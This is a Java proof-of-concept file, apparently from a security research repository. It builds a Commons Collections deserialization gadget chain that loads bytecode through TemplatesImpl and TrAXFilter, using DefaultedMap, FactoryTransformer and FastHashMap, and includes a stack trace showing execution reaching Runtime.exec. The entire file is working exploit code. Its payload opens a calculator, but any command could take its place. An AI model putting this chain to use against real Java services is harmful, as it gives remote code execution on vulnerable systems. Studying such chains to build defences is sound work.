package com.javasec.pocs.cc;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.map.DefaultedMap;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

/**
 * CC野链,字节码加载
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * create:129, InstantiateFactory (org.apache.commons.collections.functors)
 * transform:73, FactoryTransformer (org.apache.commons.collections.functors)
 * get:187, DefaultedMap (org.apache.commons.collections.map)
 * equals:376, FastHashMap (org.apache.commons.collections)
 * putVal:634, HashMap (java.util)
 * readObject:1397, HashMap (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:59, SerializeUtils (com.javasec.utils)
 * deserTester:275, SerializeUtils (com.javasec.utils)
 * main:32, CCD1 (com.javasec.pocs.cc)
 */
public class CCD1 {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        InstantiateFactory factory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
        FactoryTransformer transformer = new FactoryTransformer(factory);
        HashMap tmp = new HashMap();
        tmp.put("yy","pop");
        Map defaultmap = DefaultedMap.decorate(tmp, new ConstantTransformer(1));
        FastHashMap fastHashMap = new FastHashMap();
        fastHashMap.put("zZ","pop");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(defaultmap,"pop");
        hashMap.put(fastHashMap,"pop");
        SerializeUtils.setFinalFieldValue(defaultmap,"value",transformer);
        SerializeUtils.deserTester(hashMap);
    }
}
